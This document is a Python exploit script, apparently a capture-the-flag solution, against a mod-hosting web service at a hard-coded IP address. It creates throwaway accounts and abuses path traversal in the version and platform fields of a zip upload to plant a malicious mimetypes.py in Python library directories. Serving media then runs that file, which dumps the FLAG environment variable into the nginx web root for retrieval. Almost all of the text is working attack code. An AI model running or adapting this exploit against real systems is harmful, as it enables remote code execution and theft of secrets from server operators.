import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = "http://144.79.188.39:36310"; pf.BASE=BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u

# upload a real media file first (so we have something to serve)
tok,u=fresh()
pid = pf.create_platform(tok, "win%d"%random.randint(0,9999), name="z")
mid = pf.create_mod(tok, "2.4.1", title="z")
bid = pf.create_build(tok, mid, pid)
bio=io.BytesIO()
with zipfile.ZipFile(bio,"w",zipfile.ZIP_DEFLATED) as zf: zf.writestr("real.txt", b"REALFILE")
bio.seek(0)
requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers={"Authorization":f"Bearer {tok}"}, files={"zip_file":("p.zip",bio,"application/zip")}, timeout=20)
detail = requests.get(f"{BASE}/api/mods/{mid}/", headers={"Authorization":f"Bearer {tok}"}, timeout=15).json()
sp=[b["storage_path"] for b in detail.get("builds",[])][0]
media_url=f"{BASE}/media/{sp}/real.txt"
print("media_url", media_url)

def plant_marker(ver, code, label):
    tok2,u2=fresh()
    mal = f'import os\nopen("/usr/share/nginx/html/mm_{label}","w").write(os.environ.get("FLAG","NOFLAG"))\n'.encode()
    pid2=pf.create_platform(tok2, code, name="z"); mid2=pf.create_mod(tok2, ver, title="z"); bid2=pf.create_build(tok2, mid2, pid2)
    r=pf.upload_zip(tok2, mid2, bid2, {"mimetypes.py": mal})
    print("plant",label,"->",r.status_code)
    return tok2,u2

# plant in both dirs, then serve media (first media serve triggers mimetypes)
plant_marker("../../..", "usr/lib/python3.11", "A_usrlib")
plant_marker("../../../usr/local", "lib/python3.11", "B_usrlocal")
time.sleep(1)
c = requests.get(media_url, timeout=10)
print("media serve ->", c.status_code, repr(c.content[:40]))
for mk in ["mm_A_usrlib","mm_B_usrlocal"]:
    r=requests.get(f"{BASE}/{mk}", timeout=6)
    print(mk, r.status_code, repr(r.content[:60]))
